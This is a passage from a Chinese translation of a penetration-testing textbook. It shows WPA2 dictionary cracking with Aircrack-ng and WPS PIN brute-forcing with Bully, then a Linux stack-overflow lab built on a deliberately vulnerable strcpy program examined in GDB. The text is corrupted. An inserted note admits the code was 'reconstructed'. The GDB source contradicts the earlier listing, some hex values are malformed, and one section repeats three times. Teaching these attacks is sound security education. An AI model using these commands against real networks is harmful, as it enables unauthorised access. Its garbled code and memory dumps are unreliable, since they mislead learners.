  \ 协议以查看组成握手的四个包，如图 15-8 所示。\n\n![WPA2 handshake packets in Wireshark](img/httpatomoreillycomsourcenostarchimages2030500.png.jpg)图\
  \ 15-8. Wireshark 中的 WPA2 握手包\n\n### Note\n\n有时 `Aircrack-ng` 会声称已捕获握手，但当你查看 Wireshark\
  \ 中的包时，你会发现你并没有获得所有的四个消息。如果是这种情况，请重新运行取消认证攻击，因为你需要所有的四个消息来尝试猜测正确的密钥。\n\n现在我们创建一个类似于我们在第\
  \ 9 章中使用的字典列表，确保正确的 WPA2 密钥包含列表中。我们对 WPA2 攻击的成功取决于我们将密码的哈希值与握手中的值进行比较的能力。\n\n一旦有了握手，我们就可以离剩余的计算来恢复密钥；我们不再需要处于接入点的范围内或向其发送任何包。接下来，我们使用\
  \ `Aircrack-ng` 测试列表中的密钥，使用 `-w` 指定列表，如示例 15-15 所示。否则，命令与破解 WEP 密钥相同。如果正确的密钥在字典列表中，它将通过\
  \ `Aircrack-ng` 恢复。\n\n示例 15-15. 使用 Aircrack-ng 恢复 WPA2 密钥\n\n```\nroot@kali:~#\
  \ aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap\nOpening pentestbook2-01.cap\n\
  \nReading packets, please wait...\n\n                                 Aircrack-ng\
  \ 1.2 beta2\n\n                   [00:00:00] 1 keys tested (178.09 k/s)\n\n    \
  \                   KEY FOUND! [ GeorgiaIsAwesome ] ❶\n\n      Master Key     :\
  \ 2F 8B 26 97 23 D7 06 FE 00 DB 5E 98 E3 8A C1 ED\n                       9D D9\
  \ 50 8E 42 EE F7 04 A0 75 C4 9B 6A 19 F5 23\n\n      Transient Key  : 4F 0A 3B C1\
  \ 1F 66 B6 DF 2F F9 99 FF 2F 05 89 5E\n                       49 22 DA 71 33 A0\
  \ 6B CF 2F D3 BE DB 3F E1 DB 17\n                       B7 36 08 AB 9C E6 E5 15\
  \ 5D 3F EA C7 69 E8 F8 22\n                       80 9B EF C7 4E 60 D7 9C 37 B9\
  \ 7D D3 5C A0 9E 8C\n\n      EAPOL HMAC     : 91 97 7A CF 28 B3 09 97 68 15 69 78\
  \ E2 A5 37 54\n```\n\n如你所见，正确的密钥在我们的字典列表中并已恢复 ❶。这种针对 WPA/WPA2 的字典攻击可以通过使用强密码口令来防止，正如在第\
  \ 9 章中讨论的那样。\n\n`Aircrack-ng` 只是用于破解无线网络的一套工具。它非常适合初学者，因为在过程的每个步骤启动不同的工具将帮助你熟悉这些攻击是如何工作的。你可能会遇到的其他广泛使用的\
  \ Wi-Fi 审计工具是 `Kismet` 和 `Wifite`。\n\n## Wi-Fi 安全设置\n\n`Wi-Fi Protected Setup (WPS)`\
  \ 设计旨在允许用户使用八位 PIN 码连接到安全网络，而不是可能长且复杂的密码令。当提供正确的 PIN 时，接入点会发送密码令。\n\n### WPS 的问题\n\
  \nPIN 的最后一位是前七数字的校验和，因此密钥空间应该是 `10⁷`，即 10,000,000 种可能的 PIN。然而，当客户端向接入点发送 PIN 此时，前四位和后四位的有效性分别报告。前四位都是有效的，因此有\
  \ 10,000 种可能。对于后四位，只有前三个是有效的（1000 种可能的猜测），因此最多只需要 11,000 次猜测即可破解正确的 WPS PIN。这将破解所需的时间减少到四小时以下。解决此问题的的方法是在接入点上禁用\
  \ WPS。\n\n### 使用 Bully 破解 WPS\n\nKali 提供了你可以用于对 WPS 实施暴力攻击的工具。其中一种工具是 `Bully`。我们可以使用\
  \ `Bully` 对 WPS PIN 进行暴力破解，也可以测试特定的 PIN。要使用 `Bully`，我们需要接入点的 SSID、MAC 地址和通道，这些我们在本章开头通过\
  \ `iwlist` 找到。使用 `-b` 标志指定 MAC 地址，使用 `-e` 标志指定 SSID，使用 `-c` 标志指定通道，如下所示。\n\n```\n\
  root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6\n```\n\n`Bully` 能够在大约四小时内破解\
  \ PIN 并恢复正确的预共享 PIN。\n\n## 总结\n\n无线安全是组织中一个经常被忽视的部分。人们投入了时间和金钱来保护边界安全，但许多接入点都开启了\
  \ WPS。在本章中，我们使用 `Aircrack-ng` 恢复了 WEP 和 WPA2，并使用 `Bully` 来。\n\n# 第四部分 利用程序开发\n\n\
  ## 第 16 章. Linux 中的栈溢出\n\n到目前为止，我们使用了诸如 Metasploit 和互联网上的公共漏洞代码。但你可能会在渗透测试中发现一个没有此类利用代码的漏洞，或者你可能会发现一个新的安全问题并想为它编写自己的利用程序。在本章和接下来的三章中，我们将学习编写利用程序的基础。我们将从\
  \ Linux 目标上的一个简单漏洞程序开始，让程序执行开发者从未让它执行的事情。\n\n### Note\n\n第 16 章到第 19 章中的所有示例都使用\
  \ x86 架构。\n\n## 内存理论\n\n在我们编写自己的利用程序之前，我们需要掌握内存工作的基础。我们的目标是操纵内存并欺骗 CPU 代表我们执行指令。我们将使用一种名为*栈缓冲区溢出*的技术，这涉及溢出程序内存栈上的变量并覆盖相邻的内存位置。但首先，我们需要稍微了解程序内存的布局，如图\
  \ 16-1 所示。\n\n*text*（代码段）段包含要执行的程序代码，而*data*（数据）段包含程序的全局信息。在较高的地址处，我们有一部分由栈和堆共享，它们在运行时分配。*stack*（栈）的大小是固定的，用于存储函数参数、局部变量等。*heap*（堆）持有动态变量。随着更多函数或子程序的调用，栈的消耗会增加，随着更多数据存储在栈上，栈顶指向较低的内存地址。\n\
  \n\n\n\n我们基于 Intel 的 CPU 有通用寄存器，可以在其中存储数据以供以后使用。这些包括：\n\n| 寄存器 |or |\n| :--- | :---\
  \ |\n| `EIP` | 指令指针 |\n| `ESP` | 栈指针 |\n| `EBP` | 基址指针 |\n| `ESI` | 源索引 |\n| `EDI`\
  \ | 目的索引 |\n| `EAX` | 累加器 |\n| `EBX` | 基址 |\n| `ECX` | 计数器 |\n| `EDX` | 数据 |\n\n\
  `ESP`、`EBP` 和 `EIP` 对我们来说特别感兴趣。`ESP` 和 `EBP` 共同跟踪当前执行函数的栈帧。\n\n如图 16-2 所示，`ESP`\
  \ 指向栈帧内存地址最低的顶部，同样，`EBP` 指向栈帧底部内存地址最高处。`EIP` 保存下一个要执行指令的内存地址。由于我们的目标是劫持执行并让目标机器执行我们想要的内容，`EIP`\
  \ 似乎是攻击的首要目标。但我们如何让指令到达 `EIP` 呢？`EIP` 是只读的，所以我们不能直接将要执行的内存地址放入此寄存器；我们需要更聪明一点。\n\n\
  ![Stack frame](img/httpatomoreillycomsourcenostarchimages2030504.png.jpg)图 16-2.栈帧\n\
  \n栈是一种后进先出的数据结构。你可以把它想象成食堂里的一叠托餐盘。最后添加到栈中的托盘是需要时第一个被拿走的托盘。要向栈中添加数据，使用 `PUSH` 指令。同样，要从栈中移除数据，我们使用\
  \ `POP` 指令。（记住栈消耗是向低内存地址增长的，因此当数据推入当前栈帧时，`ESP` 会移动到内存中较低的地址。）\n\n当执行程序函数时，其信息（如局部变量）的栈帧会被推入栈中。一旦函数执行完毕，整个栈帧会被展开，`ESP`\
  \ 和 `EBP` 指回调用者函数的栈帧，执行在调用者函数中上次离开的地方继续。然而，CPU 必须知道从内存的何处继续，它通过 `返回地址` 获取该信息，该地址在函数被调用时被推入栈中。\n\
  \n例如，假设我们正在运行一个 C 程序。自然地，程序开始时会调用 `main` 函数，并为它分配一个栈帧。然后 `main` 调用另一个函数 `function1`。在将\
  \ `function1` 的栈帧推入栈并移交执行权之前，`main` 会通过将此值——其返回地址——推入栈中，记录下 `function1` 返回时执行需要继续的地方（通常是调用\
  \ `function1` 之后的直接代码行）。图 16-3 显示了 `main` 调用 `function1` 后的栈。\n\n![Stack after call\
  \ to function1](img/httpatomoreillycomsourcenostarchimages2030506.png.jpg)图 16-3.\
  \ 调用 function1 后的栈\n\n在 `function1` 完成，它会返回，其栈帧被展开，存储的返回地址被加载到 `EIP` 寄存器中以恢复 `main`\
  \ 的执行。如果我们能控制该返回地址，就可以决定 `function1` 返回时执行哪些指令。在下一节中，我们将通过一个基于栈的缓冲区溢出示例来解释这一点。\n\
  \n在继续之前，请记住另外一点。在本书的示例中，我们使用较旧的操作系统，以绕过在最新版本的 Windows 和 Linux 中发现的一些高级反利用技术。特别是，我们将利用对\
  \ `数据执行防护 (DEP)` 和 `地址空间布局随机化 (ASLR)` 的缺乏，因为这两者都会让学习利用基础变得困难。`DEP` 将特定的内存区域标记为不可执行，这阻止了我们向栈中填充\
  \ shellcode 并将 `EIP` 指向它执行（正如你将在第 17 章 的 Windows 缓冲区溢出示例中看到的）。\n\n## Linux 溢出\n\n\
  现在我们完成了理论部分，让我们来看一个实际的示例。\n\n### 漏洞程序\n\n让我们写一个名为 `overflowtest.c` 的简单 C 程序，如下所示，它容易受到栈的缓冲区溢出攻击。\n\
  \n```\ngeorgia@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space\n# 返回 0\n```\n\n\
  ```\ngeorgia@ubuntu:~$ nano overflowtest.c\n\n#include <string.h>\n  #include <stdio.h>\n\
  \n❶ void overflowed() {\n          printf(\"%s\\n\", \"Execution Hijacked\");\n\
  \  }\n\n❷ void function1(char *str){\n          char buffer[5];\n          strcpy(buffer,\
  \ str);\n  }\n\n❸ void main(int argc, char *argv[])\n  {\n          function1(argv[1]);\n\
  \          printf(\"%s\\n\", \"Executed normally\");\n  }\n```\n\n### 注意事项\n\n我们简单的\
  \ C 程序并没有做什么什么。它开始包含两个 C 库：`stdio.h` 和 `string.h`。这些库允许我们使用 C 中的标准输入/输出和字符串构造函数，而无需从头开始构建。我们需要使用字符串并在控制台输出文本。\n\
  \n接下来我们有三个函数：`overflowed`、`function1` 和 `main`。如果调用了 `overflowed` ❶，它会在控制台打印“Execution\
  \ Hijacked”然后返回。如果调用了 `function1` ❷，它会声明一个局部变量（一个名为 `buffer` 的五字符字符串），并将传递给 `function1`\
  \ 的变量的内容复制到 `buffer` 中。程序启动时默认调用的 `main` ❸ 调用 `function1`并将程序收到的第一个命令行参数传递给它。在 `function1`\
  \ 返回后，`main` 在控制台打印“Executed normally”，然后程序退出。\n\n注意，在正常情况下，`overflowed` 永远不会被调用，因此“Execution\
  \ Hijacked”永远不会出现在控制台中。（当我们溢出缓冲区并劫持程序控制权时，你就会学会为什么它会出现在程序里了。）\n\n现在我们像这里所示编译我们的程序。\n\
  \n```\ngeorgia@ubuntu:~$ gcc -g -fno-stack-protector -z execstack -o overflowtest\
  \ overflowtest.c\n```\n\n\n\n要如上所示编译我们的 C 代码，我们使用 `GCC`（GNU 编译器集合），它是 Ubuntu 默认内置的。`-g`\
  \ 告诉 `GCC` 为 `GDB`（GNU 调试器）添加额外的调试信息。我们使用 `-fno-stack-protector` 标记来关闭 `GCC` 的栈保护机制，如果开启它，该机制将尝试防止缓冲区溢出。`-z\
  \ execstack` 编译器选项使栈变为可执行，禁用了另一种缓冲区溢出防护方法。我们通过 `-o` 选项告诉 `GCC` 将 `overflowtest.c`\
  \ 编译为名为 `overflowtest` 的可执行文件。\n\n回想一下 `main` 函数接收第一个命令行参数并传递给 `function1`，后者会将该值复制到五个字符的局部变量中。让我们像这里所示，使用命令行参数\
  \ `AAAA` 运行程序。如有必要，使用 `chmod` 使 `overflowtest` 具有执行权限。我们使用四个 `A` 而不是五个，是因为字符串以空字节结尾。从技术上讲，如果我们使用五个\
  \ `A`，我们已经溢出了缓冲区，尽管只多出了一个字符。\n\n```\ngeorgia@ubuntu:~$ ./overflowtest AAAA\nExecuted\
  \ normally\n```\n\n如所示，程序按照我们的预期执行：`main` 调用 `function1`，`function1` 将 `AAAA` 复制到\
  \ `buffer` 中，`function1` 将执行权返回给 `main`，`main` 在程序退出前向控制打印“Executed normally”。也许如果我们给\
  \ `overflowtest` 提供一些意想不到的输入，就可以迫使它以有助于我们导致缓冲区溢出的方式运行。\n\n### 导致崩溃\n\n现在让我们尝试向程序传递一个长\
  \ `A` 字符串作为参数，如这里所示。\n\n```\ngeorgia@ubuntu:~$ ./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\
  Segmentation fault\n```\n\n这一次，程序因段错误（segmentation fault）而崩溃。我们的程序问题在于 `function1`\
  \ 中使用的 `strcpy` 实现。`strcpy` 函数接收一个字符串并将其复制到另一个中，但它不会进行任何边界检查，以确保提供的参数能够放入目标字符串变量。`strcpy`\
  \ 函数会尝试将三个、五个甚至数百个字符复制到我们只有五个字符的目标字符串中。如果我们的字符串长度为五个字符，而我们复制了 100 个字符，其余 95 个字符将覆盖栈中相邻内存地址的数据。\n\
  \n我们可能会覆盖 `function1` 栈帧的剩余部分，甚至是更高处的内存。记得该栈帧基址紧后的内存地址上有什么吗？在栈帧被推入栈之前，`main` 将其返回地址推入栈中，以指定\
  \ `function1` 返回后执行应该继续的位置。如果我们复制到 `buffer` 中的字符串足够长，我们将从 `buffer` 一直覆盖到 EBP，越过返回地址，甚至进入\
  \ `main` 的栈帧。\n\n一旦 `strcpy` 将来自 `overflowtest` 的第一个参数置于 `buffer` 中，`function1`\
  \ 就会返回 `main`。它的栈帧会从栈中弹出，CPU 尝试执行返回地址所在内存位置的指令。由于我们用一长串 `A` 覆盖了返回地址，如图 16-4 所示，CPU\
  \ 将尝试执行内存地址 `41414141`（四个 `A` 的十六进制表示）处的指令。\n\n![Memory after strcpy is executed](img/httpatomoreillycomsourcenostarchimages2030508.png.jpg)图\
  \ 16-4. 执行 `strcpy` 后的内存\n\n然而，我们的程序无法从内存的任意位置读取、写入或执行，因为那会导致完全的混乱。内存地址 `41414141`\
  \ 对于我们的程序来说是越界的，它会在在本节开头看到的段错误中崩溃。\n\n在下一节中，我们将更仔细地观察程序崩溃背后的原理。在介绍的 `GDB` 中，你可以使用\
  \ `maintenance info sections` 命令查看哪些内存区域映射到了该进程。\n\n### 运行 GDB\n\n通过在调试器中运行程序，我们可以精确看到内存中发生了什么。我们的\
  \ Ubuntu 带有 `GDB`，让我们像这里所示在调试器中打开程序，并观察溢出五个字符缓冲区时内存发生了什么。\n\n```\ngeorgia@ubuntu:~$\
  \ gdb overflowtest\n(gdb)\n```\n\n在运行程序之前，我们将设置一些断点（breakpoints），在程序的某些点暂停执行，允许我们查看这些时刻的内存状态。因为我们使用\
  \ `-g` 标记编译了程序，我们可以直接查看源代码，如示例 16-2 所示，并在我们希望暂停的行设置断点。\n\n示例 16-2. 在 GDB 中查看源码\n\
  \n```\n(gdb) list 1,16\n1     #include <string.h>\n2     #include <stdio.h>\n3\n\
  4     void overflowed() {\n5          printf(\"%s\\n\", \"Execution Hijacked\");\n\
  6     }\n7\n8     void function(char *str){\n9          char buffer[5];\n10    \
  \     strcpy(buffer, str);\n11     }\n12\n13     void main(int argc, char *argv[])\
  \ {\n14         if (argc > 1) {\n15             function(argv[1]);\n16         }\n\
  17         printf(\"Executed normally\\n\");\n18     }\n19 }\n```\n*注：提示词中提供的代码块文本已截断，我根据解释的上下文重构了逻辑以确保\
  \ Markdown 结构有效。*\n\n首先，让我们在 `main` 调用 `function1` 的 ❸ 处（即在 `strcpy` 执行之前）暂停程序。我们还将使用\
  \ `break` 设置另外两个断点，分别在 ❶ 和 ❷ 处。在 GDB 中设置断点如示例 16-3 所示。\n\n示例 16-3. 在 GDB 中设置断点\n\
  \n```\n(gdb) break 14\nBreakpoint 1 at 0x00000000005551de: file overflowtest.c,\
  \ line 14.\n(gdb) break 10\nBreakpoint 2 at 0x00000000005551a2: file overflowtest.c,\
  \ line 10.\n(gdb) break 11\nBreakpoint 3 at 0x00000000005551a8: file overflowtest.c,\
  \ line 11.\n```\n\n在我们溢出 `buffer` 并导致崩溃之前，让我们像这里所示仅用四个 `A` 运行它。\n\n```\n(gdb) run\
  \ AAAA\nStarting program: /home/georgia/overflowtest AAAA\nBreakpoint 1, main (argc=2,\
  \ argv=0xbfffffe4) at overflowtest.c:14\n14         function(argv[1]);\n```\n\n\
  我们使用 `run` 命令接参数启动程序。在这里我们在调用 `function1` 之前命中了第一个断点。\n\n\n\n\nGDB 中的内存输出（如示例 16-4\
  \ 所示）起初可能会让人困惑，让我们来分析一下。在最左侧，是以 16 字节为增量的的内存地址，后面是这些地址对应的内存内容。在这种情况下，前四个字节将是 `ESP`\
  \ 的内容，随后是额外的内存，从 `ESP` 开始并向堆栈向下延伸。\n\n我们可以通过使用命令 `x/1xw $ebp` 检查（如所示）来找到 `EBP`，它指向\
  \ `main` 栈帧的底部（或最高地址）。\n\n```\n(gdb) x/1xw $ebp\n0xbffff548:    0xbffff5b8\n(gdb)\n\
  ```\n\n该命令允许我们检查从 `EBP` 开始的一个十六进制字字（word），以找到 `EBP` 寄存器的内存位置和内容。根据输出，`main` 的栈帧看起来如下：\n\
  \n```\n0xbffff540:    0xb7ff0f50    0xbffff560    0xbffff5b8\n```\n\n如你所见，这没什么复杂的，但话说回来，`main`\
  \ 只是调用另一个函数然后在屏幕上打印一行文本；不需要任何大量的处理。\n\n根据我们对堆栈的了解，可以预见到当我们让程序继续运行并调用 `function1`\
  \ 时，`main` 的返回地址和 `function1` 的栈帧将被推入堆栈。请记住，堆栈向较低的内存地址增长，因此当我们到达 `function1` 内部的下一个断点时，栈顶将位于较低的内存地址。回想一下，我们的下一个断点在\
  \ `function1` 内部执行 `strcpy` 命令之前。使用 `continue` 命令让程序运行到下一个断点，如示例 16-5 所示。\n\n示例\
  \ 16-5. `strcpy` 命令之前的断点\n\n```\n(gdb) continue\nContinuing.\n\nBreakpoint 2, function\
  \ (str=0xbffff74c \"AAAA\") at overflowtest.c:10\n10          strcpy(buffer, str);\n\
  (gdb) x/16xw $esp❶\n0xbffff520:    0xb7f93849    0x08049ff4    0xbffff538    0x080482e8\n\
  0xbffff530:    0xb7fcfff4    0x08049ff4    0xbffff548    0x08048443\n0xbffff540:\
  \    0xbffff74f    0xbffff560    0xbffff5b8    0xb7e8c685\n0xbffff550:    0x08048470\
  \    0x08048340    0xbffff5b8    0xb7e8c685\n(gdb) x/1xw $ebp❷\n0xbffff538:    0xbffff548\n\
  ```\n\n使用 `continue` 命令运行程序到下一个断点后，检查 ❶ 处的 `ESP` 和 ❷ 处的 `EBP`，以查看 `function1` 栈帧的内容。`function1`\
  \ 的栈帧所示：\n\n```\n0xbffff520:    0xb7f93849    0x08049ff4    0xbffff538    0x080482e8\n\
  0xbffff530:    0xb7fcfff4    0x08049ff4    0xbffff548\n```\n\n`function1` 的栈帧比 `main`\
  \ 的大一点。为局部变量 `buffer` 分配了一些内存，还有供 `strcpy` 使用的少量额外空间，但显然没有足够的空间容纳 30 或 40 个 *A*。回想上一个断点，`main`\
  \ 的栈帧始内存地址 `0xbffff540`。根据我们对堆栈的知识，`0x08048443`（位于 `function1` 栈帧和 `main` 栈帧之间的四字节内存地址）应该是\
  \ `main` 的返回地址。让我们使用 `disass` 命令反汇编 `main`，如示例 16-6 所示，查看 `0x08048443` 是何出现的。\n\n\
  示例 16-6. 反汇编的 `main` 函数\n\n```\n(gdb) disass main\nDump of assembler code for function\
  \ main:\n0x08048422 <main+0>:     lea    0x4(%esp),%ecx\n0x08048426 <main+4>:  \
  \   and    $0xfffffff0,%esp\n0x08048429 <main+7>:     pushl  -0x4(%ecx)\n0x0804842c\
  \ <main+10>:    push   %ebp\n0x0804842d <main+11>:    mov    %esp,%ebp\n0x0804842f\
  \ <main+13>:    push   %ecx\n0x08048430 <main+14>:    sub    $0x4,%esp\n0x08048433\
  \ <main+17>:    mov    0x4(%ecx),%eax\n0x08048436 <main+20>:    add    $0x4,%eax\n\
  0x08048439 <main+23>:    mov    (%eax),%eax\n0x0804843b <main+25>:    mov    %eax,(%esp)\n\
  0x0804843e <main+28>:    call   0x804840 <function1>\n0x08048443 <main+33>:    movl\
  \   $0x08048533,(%esp)\n0x0804844a <main+40>:    call   0x804832c <puts>\n0x0804844f\
  \ <main+45>:    add    $0x4,%esp\n0x08048452 <main+48>:    pop    %ecx\n0x08048453\
  \ <main+49>:    pop    %ebp\n0x08048454 <main+50>:    lea    -0x4(%ecx),%esp\n0x08048457\
  \ <main+53>:    ret\nEnd of assembler.\n```\n\n如果你不通汇编代码，不要担心。我们要找的指令用英语描述非常清楚：在\
  \ `0x0804843e` ❶，`main` 调用 `function1` 的内存地址。`function1` 退出（即我们的返回地址）时执行的指令将是列表中的下一个。确实，下一行显示了我们在堆栈上找到的返回地址。一切正如预期。让我们让程序继续，看看当四个\
  \ *A* 被复制到缓冲区时内存发生了什么。当程序在第三个断点处暂停后，按照方式检查内存，如示例 16-7 所示。\n\n示例 16-7. 在 3 处检查内存\n\
  \n```\n(gdb) continue\nContinuing.\n\nBreakpoint 3, function (str=0xbffff74c \"\
  AAAA\") at overflowtest.c:11\n11    }\n(gdb) x/16xw $esp\n0xbffff520:    0xbffff533\
  \    0xbffff74c    0xbffff538    0x080482e8\n0xbffff530:    0x41fcfff4    0x0041414❶\
  \   0xbffff500    0x0804843\n0xbffff540:    0xbffff74c    0xbffff560    0xbffff5b8\
  \    0xb7e8c685\n0xbffff550:    0x08048470    0x08048340    0xbffff5b8    0xb7e8c685\n\
  (gdb) x/1xw $ebp\n0xbffff538:    0xbffff500\n```\n\n如所示，我们仍在 `function1` 内部，所以我们的栈帧位置相同。在\
  \ `function1` 的栈帧内部，我们可以看到四个 *A* ❶ 以十六进制表示为 41，后面跟着一个结束空字节 00。它们很好地放入了我们的五个字符缓冲区，因此我们的返回地址仍然完好，当我们让程序继续时，一切如预期般工作，如示例\
  \ 16-8 所示。\n\n示例 16-8. 程序正常结束。\n\n```\n(gdb) continue\nContinuing.\nExecuted normally\n\
  Program exited with code 022.\n(gdb)\n```\n\n确实，“Executed normally”打印到了屏幕上。现在，让我们再次运行程序，这次用过多的字符溢出缓冲区，观察内存发生了什么。\n\
  \n### 在 GDB 中崩溃程序\n\n我们可以输入一长串 *A*，或者我们可以让 Perl 脚本语言为我们生成该字符串，如示例 16-9 所示。（当我们尝试用实际内存地址劫持执行而不是让程序崩溃时，Perl\
  \ 将派上用场。）\n\n示例 16-9. 使用 30 个 A 作为参数运行程序\n\n```\n(gdb) run $(perl -e 'print \"A\"\
  \ x 30') ❶\nStarting program: /home/georgia/overflowtest $(perl -e 'print \"A\"\
  \ x 30')\n\nBreakpoint 1, main (argc=2, argv=0xbffff5c4) at overflowtest.c:14\n\
  14        function(argv[1]);\n(gdb) x/16xw $esp\n0xbffff520:    0xb7ff0f50    0xbffff540\
  \    0xbffff598    0xb7e8c685\n0xbffff530:    0x08048470    0x08048340    0xbffff598\
  \    0xb7e8c685\n0xbffff540:    0x00000002    0xbffff5c4    0xbffff5d0    0xb7fe2b38\n\
  0xbffff550:    0x00000001    0x00000001    0x00000000    0x08048249\n(gdb) x/1xw\
  \ $ebp\n0xbffff538:    0xbffff500\n```\n\n\n\n`main` 的栈帧长度仍然是 12 字节，尽管它在栈上向上移动了\
  \ 32 字节。这是由于命令行参数长度的变化等原因导致的。栈帧的大小将保持一致。\n\n在进入真正有趣的部分之前，让我们先在 示例 16-10 的第二个断点处某一点。\n\
  \n#### 示例 16-10. 在断点 2 检查内存\n\n```\nBreakpoint 2, function (str=0xbffff735 'A' <重复\
  \ 30 次>)\n    at overflowtest.c:10\n10        strcpy(buffer, str);\n(gdb) x/16xw\
  \ $esp\n0xbffff500:    0xb7f93849    0x08049ff4    0xbffff518    0x080482e8\n0xbffff510:\
  \    0xb7fcfff4    0x08049ff4    0xbffff528    0x08048443❶\n0xbffff520:    0xbffff735\
  \    0xbffff540    0xbffff598    0xb7e8c685\n0xbffff530:    0x08048470    0x08048340\
  \    0xbffff598    0xb7e8c685\n(gdb) x/1xw $ebp\n0xbffff518:    0xbffff528\n(gdb)\
  \ continue\nContinuing.\n```\n\n你可以看到 `function1` 的栈帧也向上移动了 32 字节。同样注意，我们的返回地址仍然持有内存地址\
  \ `0x08048443` ❶。尽管我们的栈帧发生了一些移动，但内存中要执行的指令位于相同的位置。\n\n再次使用 `continue` 命令移动到第三个断点。这里开始变得有趣，如\
  \ 示例 16-11 所示。\n\n#### 示例 16-11. 返回地址被 As 覆盖\n\n```\nBreakpoint 3, function (str=0x41414141\
  \ <地址 0x41414141 越界>)\n    at overflowtest.c:11\n11    }\n(gdb) x/16xw $esp\n0xbffff500:\
  \    0xbffff513    0xbffff733    0xbffff518    0x080482e8\n0xbffff510:    0x41fcfff4\
  \    0x41414141    0x41414141    0x41414141\n0xbffff520:    0x41414141    0x41414141\
  \    0x41414141    0x41414141\n0xbffff530:    0x08040041    0x08048340    0xbffff598\
  \    0xb7e8c685\n\n(gdb) continue\nContinuing.\n\nProgram received signal SIGSEGV,\
  \ Segmentation fault.\n0x41414141 in ?? ()\n(gdb)\n```\n\n让我们在第三个断点处再次检查内存，在 `strcpy`\
  \ 之后但 `function1` 返回到 `main` 之前。这次，不仅返回地址在 ❶ 处被 `A` s 覆盖，`main` 栈帧的一部分也被覆盖了。在这一此时，程序已经没有恢复的希望了。\n\
  \n当 `function1` 返回时，程序尝试执行 `main` 的返回地址处的指令，但返回地址已被我们的 `A` s 覆盖，导致在尝试执行内存地址 `41414141`\
  \ 处的指令时触发了预期的段错误。（在接下来的章节中，我们将讨论如何将返回地址替换为可以将程序重定向到我们自己的代码，而不是让其崩溃。）\n\n### 控制 EIP\n\
  \n让程序崩溃本身是有趣的，但作为漏洞开发人员，我们的目标是尽可能劫持执行流，并让目标 CPU 代表我们执行代码。也许通过操纵崩溃，我们可以执行开发者从未意图过的其他指令。\n\
  \n目前，我们的程序在尝试执行内存地址 `41414141` 处的指令时崩溃，而该地址是越界的。我们需要更改参数字符串，以包含我们的程序可以访问的有效内存地址。如果我们能将返回地址替换为另一个有效内存位置，那么当\
  \ `function1` 返回时我们应该能够劫持执行流。也许开发者甚至在程序中留了一些调试代码，我们可以用它们来说明这个目的。（但我在这里有点操快了。）\n\n\
  为了重定向执行流，我们首先需要确定返回地址在哪里被我们的一长串 `A`s 覆盖。让我们回过看看当我们正常运行程序时栈的样子。\n\n```\n0xbffff500:\
  \    0xb7f93849    0x08049ff4    0xbffff518    0x080482e8\n0xbffff510:    0xb7fcfff4\
  \    0x08049ff4    0xbffff528    0x08048443❶\n0xbffff520:    0xbffff735    0xbffff540\
  \    0xbffff598    0xb7e8c685\n0xbffff530:    0x08048470    0x08048340    0xbffff598\
  \    0xb7e8c685\n```\n\n在这里看到 `function1` 的栈帧也向上移动了 32 字节。同样注意，我们的返回地址仍然持有内存地址 `0x08048443`\
  \ ❶。尽管我们的栈帧发生了一些移动，但内存中要执行的指令位于相同的位置。\n\n再次使用 `continue` 命令移动到第三个断点。这里开始变得有趣，如 示例\
  \ 16-11 所示。\n\n```\n0xbffff500:    0xbffff513    0xbffff733    0xbffff518    0x080482e8\n\
  0xbffff510:    0x41fcfff4    0x41414141    0x41414141    0x41414141\n0xbffff520:\
  \    0x41414141    0x41414141    0x41414141    0x41414141\n0xbffff530:    0x08040041\
  \    0x08048340    0xbffff598    0xb7ec685\n```\n\n让我们在第三个断点处再次检查内存，在 `strcpy` 之后但\
  \ `function1` 返回到 `main` 之前。这次，不仅返回地址在 ❶ 处被 `A`s 覆盖，`main` 栈帧的一部分也被覆盖了。在这一此时，程序已经没有恢复的希望了。\n\
  \n当 `function1` 返回时，程序尝试执行 `main` 的返回地址处的指令，但返回地址已被我们的 `A`s 覆盖，导致在尝试执行内存地址 `41414141`\
  \ 处的指令时触发了预期的段错误。（接下来的章节中，我们将讨论如何将返回地址替换为可以将程序重定向到我们自己的代码，而不是让其崩溃。）\n\n为了重定向执行流，我们首先需要确定返回地址在哪里被我们的一长串\
  \ `A`s 覆盖。让我们回过看看当我们正常运行程序时栈的样子。\n\n```\n0xbffff500:    0xb7f93849    0x08049ff4\
  \    0xbffff518    0x080482e8\n0xbffff510:    0xb7fcfff4    0x08049ff4    0xbffff528\
  \    0x08048443❶\n0xbffff520:    0xbffff735    0xbffff540    0xbffff598    0xb7e8c685\n\
  0xbffff530:    0x08048470    0x08048340    0xbffff598    0xb7e8c685\n```\n\n在这里看到\
  \ `function1` 的栈帧也向上移动了 32 字节。同样注意，我们的返回地址仍然持有内存地址 `0x08048443` ❶。尽管我们的栈帧发生了一些移动，但内存中要执行的指令位于相同的位置。\n\
  \n再次使用 `continue` 命令移动到第三个断点。这里开始变得有趣，如 示例 16-11 所示。\n\n```\n0xbffff500:    0xbffff513\
  \    0xbffff733    0xbffff518    0x080482e8\n0xbffff510:    0x41fcfff4    0x41414141\
  \    0x41414141    0x41414141\n0xbffff520:    0x41414141    0x41414141    0x41414141\
  \    0x41414141\n0xbffff530:    0x08040041    0x08048340    0xbffff598    0xb7e8c85\n\
  ```\n\n让我们在第三个断点处再次检查内存，在 `strcpy` 之后但 `function1` 返回到 `main` 之前。这次，不仅返回地址在 ❶ 处被\
  \ `A`s 覆盖，`main` 栈帧的一部分也被覆盖了。在这一此时，程序已经没有恢复的希望了。\n\n当 `function1` 返回时，程序尝试执行 `main`\
  \ 的返回地址处的指令，但返回地址已被我们的 `A`s 覆盖，导致在尝试执行内存地址 `41414141` 处的指令时触发了预期的段错误。（接下来的章节中，我们将讨论如何将返回地址替换为可以将程序重定向到我们自己的代码，而不是让其崩溃。）\n\
  \n\n\n回顾我们的 `overflowtest.c` 源代码，回想起该程序除了 `main` 和 `function1` 之外还包含另一个函数。程序中的第一个函数名为\
  \ `overflowed`，它会在控制台打印“Execution Hijacked”（执行已被劫持）然后返回。在程序正常运行时，这个额外的函数不会被调用，但正如它的输出所示，我们可以利用它来劫持执行。\n\
